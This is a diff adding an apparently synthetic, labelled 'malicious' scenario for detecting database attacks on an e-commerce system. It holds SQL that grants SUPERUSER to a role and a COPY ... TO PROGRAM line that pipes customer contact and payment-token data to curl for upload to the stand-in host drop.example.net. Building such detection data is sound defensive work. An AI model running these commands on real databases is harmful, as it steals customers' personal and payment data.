@@ -1,0 +1,24 @@
+scenario_id: ecommerce_alter_role_esc_0013
+family_id: ecommerce_alter_role_esc_0013
+domain: ecommerce
+time_of_day: 02:30
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate
+  role: support_agent
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5445154762615982
+  events:
+  - sql: ALTER ROLE fraud_analyst WITH SUPERUSER
+  - sql: SELECT email, phone, shipping_address, full_name FROM customers WHERE created_at > NOW() - INTERVAL '365 days'
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 104.244.72.115
+      port: 8080
